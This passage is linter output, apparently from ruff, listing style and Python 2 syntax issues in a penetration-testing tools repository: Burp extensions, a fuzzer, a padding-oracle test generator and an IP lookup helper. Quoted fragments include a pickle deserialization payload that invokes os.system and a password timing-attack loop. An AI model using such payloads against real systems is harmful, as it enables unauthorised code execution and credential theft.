     |         ^^^^^^^^^^^
1513 |         payload = reencode.decode(payload, ReEncoder.PREFER_BINARY)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1554:19
     |
1552 |             self.payloadsToGenerate = len(self.mutations)
1553 |
1554 |             print("[.] Generated {} mutations".format(len(self.mutations)))
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1555 |
1556 |         # print('[>] Returning mutation {}: "{}"'.format(
     |
help: Convert to f-string

N803 Argument name `currentPayload` should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1597:30
     |
1595 |         return self.payloadsGenerated < self.payloadsToGenerate
1596 |
1597 |     def getNextPayload(self, currentPayload):
     |                              ^^^^^^^^^^^^^^
1598 |         payload = self._helpers.bytesToString(currentPayload)
     |

N806 Variable `origPayload` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1601:9
     |
1600 |         reencode = ReEncoder()
1601 |         origPayload = payload
     |         ^^^^^^^^^^^
1602 |         payload = reencode.decode(payload)
     |

N806 Variable `typeHandler` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1620:13
     |
1618 |         self.mutations = []
1619 |
1620 |         for typeHandler in self.typeHandlers:
     |             ^^^^^^^^^^^
1621 |             typeHandler.reset()
     |

N806 Variable `typeHandler` in function should be lowercase
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1626:13
     |
1625 |     def prepareMutations(self, payload):
1626 |         for typeHandler in self.typeHandlers:
     |             ^^^^^^^^^^^
1627 |             if typeHandler.check(payload):
1628 |                 print(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1629:21
     |
1627 |               if typeHandler.check(payload):
1628 |                   print(
1629 | /                     '\n[.] Payload "{}" will be handled by: {}'.format(
1630 | |                         payload[:100], typeHandler.name()
1631 | |                     )
     | |_____________________^
1632 |                   )
1633 |                   return typeHandler.getMutations(payload)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:1644:19
     |
1642 |             self.payloadsToGenerate = len(self.mutations)
1643 |
1644 |             print("[.] Generated {} mutations".format(len(self.mutations)))
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1645 |
1646 |         # print('[>] Returning mutation {}: "{}"'.format(
     |
help: Convert to f-string

W291 Trailing whitespace
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:25:52
   |
23 |     ticket = ''
24 |
25 |     def registerExtenderCallbacks(self, callbacks):  
   |                                                    ^^
26 |         # sys.stdout = callbacks.getStdout()
   |
help: Remove trailing whitespace

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:28:15
   |
26 |         # sys.stdout = callbacks.getStdout()
27 |
28 |         print '[+] Ticket appender is loading...'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 |         self._callbacks = callbacks
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:71:35
   |
70 |                         if ticket != self.ticket:
71 |                             print "[?] Cookie's value changed: '%s' => '%s'" % (ticket, self.ticket)
   |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
72 |                             self.ticket = ticket
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:75:23
   |
74 |                 url = headers[0]
75 |                 print '[*] Working url: "%s"' % url
   |                       ^^^^^^^^^^^^^^^^^^^^^^^
76 |                 print '[*] Self.ticket = "%s"' % self.ticket
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:76:23
   |
74 |                 url = headers[0]
75 |                 print '[*] Working url: "%s"' % url
76 |                 print '[*] Self.ticket = "%s"' % self.ticket
   |                       ^^^^^^^^^^^^^^^^^^^^^^^^
77 |
78 |                 if TRIGGER_PATTERN in url and self.ticket != '' and PARAMETER_NAME + '=' not in url:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:79:27
   |
78 |                 if TRIGGER_PATTERN in url and self.ticket != '' and PARAMETER_NAME + '=' not in url:
79 |                     print '[?] No Ticket parameter in URL. Adding it...'
   |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
80 |
81 |                     newHeaders = list(headers)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:83:27
   |
81 |                     newHeaders = list(headers)
82 |                     newHeaders[0] = self.addUrlParam(url, PARAMETER_NAME, ' ' + self.ticket)
83 |                     print '[?] Updating URL from: "%s" => "%s"' % (headers[0], newHeaders[0])
   |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
84 |
85 |                     bodyBytes = currentRequest.getRequest()[requestInfo.getBodyOffset():]
   |

W292 No newline at end of file
  --> security\penetration-testing-tools\web\burpCookieToUrl.py:91:22
   |
89 |                     currentRequest.setRequest(newMessage)
90 |
91 | # FixBurpExceptions()
   |                      ^
   |
help: Add trailing newline

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\web\dummy-web-server.py:33:1
   |
31 |     def do_HEAD(self):
32 |         self._set_headers()
33 |         
   | ^^^^^^^^
34 |     def do_POST(self):
35 |         # Doesn't do anything with posted data
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\web\dummy-web-server.py:38:1
   |
36 |         self._set_headers()
37 |         self.wfile.write("<html><body><h1>POST!</h1></body></html>")
38 |         
   | ^^^^^^^^
39 | def run(server_class=HTTPServer, handler_class=S, port=80):
40 |     server_address = ('', port)
   |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\dummy-web-server.py:42:11
   |
40 |     server_address = ('', port)
41 |     httpd = server_class(server_address, handler_class)
42 |     print 'Starting httpd...'
   |           ^^^^^^^^^^^^^^^^^^^
43 |     httpd.serve_forever()
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\http-auth-timing.py:23:15
   |
21 |     pass_so_far = ''
22 |     while True:
23 |         print '\n[>] Password so far: "%s"\n' % pass_so_far
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |         times = {}
25 |         avg_times = {}
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\http-auth-timing.py:33:27
   |
31 |                 t = fetch(url, username, password)
32 |                 if t == 0:
33 |                     print 'Password found: "%s"' % password
   |                           ^^^^^^^^^^^^^^^^^^^^^^
34 |                     return
35 |                 times[p].append(t)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\http-auth-timing.py:39:23
   |
37 |             avg_times[p] = sum(times[p]) / float(RETRIES)
38 |             if ord(p) > 32:
39 |                 print '\tLetter: "%c" - time: %f' % (p, avg_times[p])
   |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
40 |         
41 |         max_time = [0,0]
   |

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\web\http-auth-timing.py:40:1
   |
38 |             if ord(p) > 32:
39 |                 print '\tLetter: "%c" - time: %f' % (p, avg_times[p])
40 |         
   | ^^^^^^^^
41 |         max_time = [0,0]
42 |         for letter, time_ in times.items():
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\web\http-auth-timing.py:46:1
   |
44 |                 max_time[0] = letter
45 |                 max_time[1] = time_
46 |             
   | ^^^^^^^^^^^^
47 |         pass_so_far += max_time[0]
   |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\http-auth-timing.py:51:15
   |
49 | if __name__ == '__main__':
50 |     if len(sys.argv) < 3:
51 |         print 'usage: http-auth-timing.py <url> <username>'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
52 |
53 |     main(sys.argv[1], sys.argv[2])
   |

W292 No newline at end of file
  --> security\penetration-testing-tools\web\http-auth-timing.py:53:35
   |
51 |         print 'usage: http-auth-timing.py <url> <username>'
52 |
53 |     main(sys.argv[1], sys.argv[2])
   |                                   ^
   |
help: Add trailing newline

W291 Trailing whitespace
 --> security\penetration-testing-tools\web\padding-oracle-tests.py:6:2
  |
4 | #   Mariusz Banach / mgeeky, 2016
5 | #   v0.2
6 | # 
  |  ^
7 | #   Simple utility that aids the penetration tester when manually testing Padding Oracle condition
8 | #   of a target cryptosystem, by generating set of test cases to fed the cryptosystem with.
  |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\web\padding-oracle-tests.py:34:2
   |
32 | # [?] Data resembles block cipher with block size = 16
33 | # [?] Data resembles block cipher with block size = 8
34 | # 
   |  ^
35 | # Generated in total: 512 test cases for 8, 16 block sizes.
36 | # Byte: 0x87 not generated decryption error.
   |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:125:87
    |
124 |         if e < 5.0:
125 |             info('\tData does not look random, not likely to deal with block cipher.')    
    |                                                                                       ^^^^
126 |         elif e >= 5.0 and e < 7.0:
127 |             info('\tData only resembles random stream, hardly to be dealing with block cipher.')
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:204:1
    |
202 |             if self.urlencoded:
203 |                 data = urllib.unquote_plus(data)
204 |             
    | ^^^^^^^^^^^^
205 |             if self.encoding == PaddingOracleTestCasesGenerator.B64URL:
206 |                 return base64.urlsafe_b64decode(data)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:247:1
    |
245 |                     cases.append(self.encode(self.construct_second_to_last_block(data, size, byte, self.offset)))
246 |                     cases.append(self.encode(self.construct_second_to_last_block(data, size, byte, -self.offset)))
247 |          
    | ^^^^^^^^^
248 |         return cases
    |
help: Remove whitespace from blank line

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:264:30
    |
263 |         for j in range(n-16, n):
264 |             if j >= len(data): break
    |                              ^
265 |             line += '%02x ' % ord(data[j])
    |

E701 Multiple statements on one line (colon)
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:270:30
    |
269 |         for j in range(n-16, n):
270 |             if j >= len(data): break
    |                              ^
271 |             c = data[j] if not (ord(data[j]) < 0x20 or ord(data[j]) > 0x7e) else '.'
272 |             line += '%c' % c
    |

invalid-syntax: Simple statements must be separated by newlines or semicolons
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:304:19
    |
302 |             dbg('...' + case[-48:])
303 |         else:
304 |             print case
    |                   ^^^^
305 |     
306 |     info('\n[+] Generated in total: %d test cases for %s block sizes.' \
    |

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\padding-oracle-tests.py:305:1
    |
303 |         else:
304 |             print case
305 |     
    | ^^^^
306 |     info('\n[+] Generated in total: %d test cases for %s block sizes.' \
307 |         % (len(cases), ', '.join([str(e) for e in sorted(tester.blocksizes)])))
    |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\web\pickle-payload.py:20:7
   |
18 |         return (os.system,(COMMAND,))
19 |
20 | print base64.b64encode(cPickle.dumps(PickleRce()))
   |       ^^^^^^
   |

N999 Invalid module name: 'ipLookupHelper'
--> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:1:1

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
4 | # IP Lookup utility aiming to help gather expected details of a specific IPv4 address.
  |
help: Remove unnecessary coding comment

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:19:1
   |
17 | VERSION = "0.4"
18 |
19 | import json
   | ^^^^^^^^^^^
20 | import pprint
21 | import random
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:20:1
   |
19 | import json
20 | import pprint
   | ^^^^^^^^^^^^^
21 | import random
22 | import re
   |

F401 [*] `pprint` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:20:8
   |
19 | import json
20 | import pprint
   |        ^^^^^^
21 | import random
22 | import re
   |
help: Remove unused import: `pprint`

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:21:1
   |
19 | import json
20 | import pprint
21 | import random
   | ^^^^^^^^^^^^^
22 | import re
23 | import socket
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:22:1
   |
20 | import pprint
21 | import random
22 | import re
   | ^^^^^^^^^
23 | import socket
24 | import ssl
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:23:1
   |
21 | import random
22 | import re
23 | import socket
   | ^^^^^^^^^^^^^
24 | import ssl
25 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:24:1
   |
22 | import re
23 | import socket
24 | import ssl
   | ^^^^^^^^^^
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:25:1
   |
23 | import socket
24 | import ssl
25 | import sys
   | ^^^^^^^^^^
26 | from urllib.parse import parse_qsl, urlparse
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:26:1
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
27 |
28 | import requests
   |

F401 [*] `urllib.parse.parse_qsl` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:26:26
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |                          ^^^^^^^^^
27 |
28 | import requests
   |
help: Remove unused import

F401 [*] `urllib.parse.urlparse` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:26:37
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |                                     ^^^^^^^^
27 |
28 | import requests
   |
help: Remove unused import

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:28:1
   |
26 | from urllib.parse import parse_qsl, urlparse
27 |
28 | import requests
   | ^^^^^^^^^^^^^^^
29 | import urllib3
30 | import yaml
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:29:1
   |
28 | import requests
29 | import urllib3
   | ^^^^^^^^^^^^^^
30 | import yaml
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:30:1
   |
28 | import requests
29 | import urllib3
30 | import yaml
   | ^^^^^^^^^^^
31 |
32 | urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   |

N803 Argument name `apiKeys` should be lowercase
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:79:32
   |
77 |     cached_lookups_file = "ip-lookups-cache.json"
78 |
79 |     def __init__(self, logger, apiKeys):
   |                                ^^^^^^^
80 |         self.logger = logger
81 |         self.apiKeys = {
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:88:20
   |
86 |         if len(apiKeys) > 0:
87 |             for prov in IPLookupHelper.supported_providers:
88 |                 if prov in apiKeys.keys():
   |                    ^^^^^^^^^^^^^^^^^^^^^^
89 |                     if apiKeys[prov] == None or len(apiKeys[prov].strip()) < 2:
90 |                         continue
   |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:89:41
   |
87 |             for prov in IPLookupHelper.supported_providers:
88 |                 if prov in apiKeys.keys():
89 |                     if apiKeys[prov] == None or len(apiKeys[prov].strip()) < 2:
   |                                         ^^^^
90 |                         continue
91 |                     self.apiKeys[prov] = apiKeys[prov].strip()
   |
help: Replace with `cond is None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:114:37
    |
112 |             raise
113 |
114 |         except FileNotFoundError as e:
    |                                     ^
115 |             with open(IPLookupHelper.cached_lookups_file, "w") as f:
116 |                 json.dump({}, f)
    |
help: Remove assignment to unused variable `e`

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:124:22
    |
122 |             raise
123 |
124 |     def lookup(self, ipAddress):
    |                      ^^^^^^^^^
125 |         if len(self.apiKeys) == 0:
126 |             return {}
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:128:12
    |
126 |             return {}
127 |
128 |         if ipAddress in self.cachedLookups.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
129 |             self.logger.dbg(f"Returning cached entry for IP address: {ipAddress}")
130 |             return self.cachedLookups[ipAddress]
    |
help: Remove `.keys()`

N806 Variable `leftProvs` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:132:9
    |
130 |             return self.cachedLookups[ipAddress]
131 |
132 |         leftProvs = list(self.apiKeys.keys())
    |         ^^^^^^^^^
133 |         result = {}
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:138:39
    |
136 |             prov = random.choice(leftProvs)
137 |
138 |             if hasattr(self, prov) != None:
    |                                       ^^^^
139 |                 method = getattr(self, prov)
140 |                 self.logger.dbg(f"Calling IP Lookup provider: {prov}")
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:192:16
    |
191 |         def update(out, data, keydst, keysrc):
192 |             if keysrc in data.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
193 |                 if type(out[keydst]) == list:
194 |                     out[keydst].append(data[keysrc])
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:193:20
    |
191 |         def update(out, data, keydst, keysrc):
192 |             if keysrc in data.keys():
193 |                 if type(out[keydst]) == list:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^
194 |                     out[keydst].append(data[keysrc])
195 |                 else:
    |

N806 Variable `continentCodeToName` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:210:9
    |
208 |         }
209 |
210 |         continentCodeToName = {
    |         ^^^^^^^^^^^^^^^^^^^
211 |             "AF": "Africa",
212 |             "AN": "Antarctica",
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:229:12
    |
227 |         update(output, result, "ip", "query")
228 |         update(output, result, "timezone", "timezone")
229 |         if "time_zone" in result.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
230 |             update(output, result["time_zone"], "timezone", "name")
231 |         update(output, result, "city", "city")
    |
help: Remove `.keys()`

N806 Variable `reverseIp` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:233:9
    |
231 |         update(output, result, "city", "city")
232 |
233 |         reverseIp = ""
    |         ^^^^^^^^^
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
    |

N806 Variable `reverseIp` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:235:13
    |
233 |         reverseIp = ""
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
    |             ^^^^^^^^^
236 |         except:
237 |             pass
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:236:9
    |
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
236 |         except:
    |         ^^^^^^
237 |             pass
    |

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:242:13
    |
241 |         update(output, result, "country", "country_name")
242 |         if ("country" not in output.keys() or output["country"] == "") and (
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
243 |             "country" in result.keys() and result["country"] != ""
244 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:243:13
    |
241 |         update(output, result, "country", "country_name")
242 |         if ("country" not in output.keys() or output["country"] == "") and (
243 |             "country" in result.keys() and result["country"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^
244 |         ):
245 |             update(output, result, "country", "country")
    |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:248:13
    |
247 |         update(output, result, "country_code", "country_code")
248 |         if ("country_code" not in output.keys() or output["country_code"] == "") and (
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
249 |             "country_code2" in result.keys() and result["country_code2"] != ""
250 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:249:13
    |
247 |         update(output, result, "country_code", "country_code")
248 |         if ("country_code" not in output.keys() or output["country_code"] == "") and (
249 |             "country_code2" in result.keys() and result["country_code2"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
250 |         ):
251 |             update(output, result, "country_code", "country_code2")
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:260:13
    |
259 |         if (
260 |             "continent_code" not in result.keys() or result["continent_code"] == ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |         ) and ("continent_name" in result.keys() and result["continent_name"] != ""):
262 |             cont = result["continent_name"].lower()
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:261:16
    |
259 |         if (
260 |             "continent_code" not in result.keys() or result["continent_code"] == ""
261 |         ) and ("continent_name" in result.keys() and result["continent_name"] != ""):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |             cont = result["continent_name"].lower()
263 |             for k, v in continentCodeToName.items():
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:269:13
    |
268 |         elif (
269 |             "continent_code" in result.keys() and result["continent_code"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
270 |         ) and ("continent_name" not in result.keys() or result["continent_name"] == ""):
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:270:16
    |
268 |         elif (
269 |             "continent_code" in result.keys() and result["continent_code"] != ""
270 |         ) and ("continent_name" not in result.keys() or result["continent_name"] == ""):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:273:14
    |
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
272 |
273 |         elif "timezone" in result.keys() and result["timezone"] != "":
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
274 |             cont = result["timezone"].split("/")[0].strip().lower()
275 |             for k, v in continentCodeToName.items():
    |
help: Remove `.keys()`

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:283:26
    |
281 |         return output
282 |
283 |     def ip_api_com(self, ipAddress):
    |                          ^^^^^^^^^
284 |         # $ curl -s ip-api.com/json/89.167.131.40                                                                                    ΓÇª
285 |         # {
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:309:20
    |
307 |                 if not out:
308 |                     out = ""
309 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
310 |                     out = str(out)
    |

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:326:24
    |
324 |         return {}
325 |
326 |     def ipapi_co(self, ipAddress):
    |                        ^^^^^^^^^
327 |         # $ curl 'https://ipapi.co/89.167.131.40/json/'
328 |         # {
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:364:17
    |
362 |                       out = ""
363 |
364 | /                 if (
365 | |                     type(out) == dict
366 | |                     and "error" in out.keys()
367 | |                     and "reason" in out.keys()
368 | |                 ):
369 | |                     if out["error"] and out["reason"].lower() == "ratelimited":
    | |_______________________________________________________________________________^
370 |                           return {}
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:365:21
    |
364 |                 if (
365 |                     type(out) == dict
    |                     ^^^^^^^^^^^^^^^^^
366 |                     and "error" in out.keys()
367 |                     and "reason" in out.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:366:25
    |
364 |                 if (
365 |                     type(out) == dict
366 |                     and "error" in out.keys()
    |                         ^^^^^^^^^^^^^^^^^^^^^
367 |                     and "reason" in out.keys()
368 |                 ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:367:25
    |
365 |                     type(out) == dict
366 |                     and "error" in out.keys()
367 |                     and "reason" in out.keys()
    |                         ^^^^^^^^^^^^^^^^^^^^^^
368 |                 ):
369 |                     if out["error"] and out["reason"].lower() == "ratelimited":
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:372:20
    |
370 |                         return {}
371 |
372 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
373 |                     out = str(out)
    |

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:389:32
    |
387 |         return {}
388 |
389 |     def ipgeolocation_io(self, ipAddress):
    |                                ^^^^^^^^^
390 |         # $ curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY&ip=89.167.131.40'
391 |         # {
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:437:20
    |
435 |                 if not out:
436 |                     out = ""
437 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
438 |                     out = str(out)
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:468:12
    |
466 |     def __init__(self, logger, determinants):
467 |         self.logger = logger
468 |         if type(determinants) != dict:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
469 |             raise Exception(
470 |                 "Specified ip_geolocation_requirements must be a valid dictonary!"
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:478:20
    |
476 |             k = k.lower()
477 |             if k in IPGeolocationDeterminant.supported_determinants:
478 |                 if type(v) == str:
    |                    ^^^^^^^^^^^^^^
479 |                     self.determinants[k] = [
480 |                         v,
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:482:22
    |
480 |                         v,
481 |                     ]
482 |                 elif type(v) == list or type(v) == tuple:
    |                      ^^^^^^^^^^^^^^^
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:482:41
    |
480 |                         v,
481 |                     ]
